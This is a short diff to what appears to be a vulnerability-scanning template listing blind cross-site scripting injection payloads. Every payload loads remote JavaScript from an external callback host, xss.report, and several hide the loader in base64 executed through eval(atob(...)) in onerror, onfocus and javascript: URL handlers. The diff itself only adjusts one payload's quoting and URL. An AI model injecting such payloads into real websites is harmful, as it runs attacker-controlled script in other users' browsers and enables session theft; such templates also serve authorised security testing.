@@ -14,7 +14,7 @@ requests:
 
     payloads:
       injection:
-      - '"><script src=//xss.report/s/hnterx></script>'
+      - "'\"><script src=https://xss.report/c/hnterx></script>"
       - '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL3NoZWxsZWQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>'
       - 'javascript:eval("var a=document.createElement(\"script\");a.src=\"//xss.report/s/hnterx\";document.body.appendChild(a)")'
       - '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL3NoZWxsZWQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>'
